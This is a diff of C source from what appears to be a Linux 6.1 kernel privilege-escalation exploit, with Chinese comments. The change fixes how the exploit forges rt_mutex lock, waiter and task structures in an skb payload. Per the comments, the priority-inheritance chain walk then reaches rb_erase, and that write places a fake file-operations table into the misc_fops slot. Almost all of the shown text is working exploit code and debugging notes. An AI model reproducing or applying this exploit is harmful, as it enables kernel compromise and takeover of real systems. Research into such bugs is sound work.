@@ -540,18 +540,22 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
     put32(p, LOCK_OFF + 0x00, 0);
     if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+      /* slide 路径: owner=0, walk 走"lock is free"分支。
+       * slide 的 W1 写通过另一条路径触发(tree_entry 侧), 与 owner 无关。 */
       put64(p, LOCK_OFF + 0x08, 0);
       put64(p, LOCK_OFF + 0x10, 0);
       put64(p, LOCK_OFF + 0x18, 0);
     } else {
-      /* 第 2 关 FOPS 路径(非 SLIDE 即 FOPS): owner 必须 = fake_task|1。
-       * 若为 NULL, rt_mutex_adjust_prio_chain 走 "lock is free" 早退,
-       * rb_erase/W1 永不执行, 假 fops 写不进 misc_fops -> step=4;
-       * fake_task|1 让 walk 深入 dequeue/enqueue 链, 触发 W1 写入。
-       * (SLIDE 早退路径在上方单独分支, owner=0。) */
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
+      /* FOPS 路径: owner 必须非空且指向一个合法 task, 否则 PI 链 walk
+       * 走 "lock has no owner" 快速退出, rb_erase 永不执行,
+       * W1 写不触发 -> 全 24 次 step=4 且无 panic。
+       * owner = fake_task | 1 (bit0=1 表示 RT-mutex 持有),
+       * 配合 fake_task->pi_waiters 指向 fake_w0->pi_tree_entry,
+       * walk 走到 dequeue 分支时调用 rb_erase(pi_tree_entry),
+       * 触发 W1 写把 fake_fops 写入 misc_fops 槽。 */
+      put64(p, LOCK_OFF + 0x08, fake_task | 1);
+      put64(p, LOCK_OFF + 0x10, 0);
+      put64(p, LOCK_OFF + 0x18, 0);
     }
 
     /* 6.1 legacy rt_mutex_waiter layout (BTF verified on shennong 6.1.138):
@@ -579,16 +583,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
-    if (payload_mode == PAGE_PAYLOAD_FOPS) {
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
-    } else {
-      /* pi_waiters points to fake_w0+0x18 (6.1 pi_tree_entry offset) */
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
-            fake_w0 + 0x18);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
-            fake_w0 + 0x18);
-    }
+    /* 第 2 关 FOPS 路径: owner = fake_task|1, waiter 必须在 owner 的
+     * pi_waiters 树中, 否则 PI 链 walk 走到 owner 时找不到 waiter,
+     * rb_erase(pi_tree_entry) 永不执行 -> W1 写不触发 -> step=4。
+     * 与 slide 路径一致: pi_waiters 指向 fake_w0+0x18 (6.1 pi_tree_entry)。 */
+    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
+          fake_w0 + 0x18);
+    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
+          fake_w0 + 0x18);
     put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
     put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
     put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
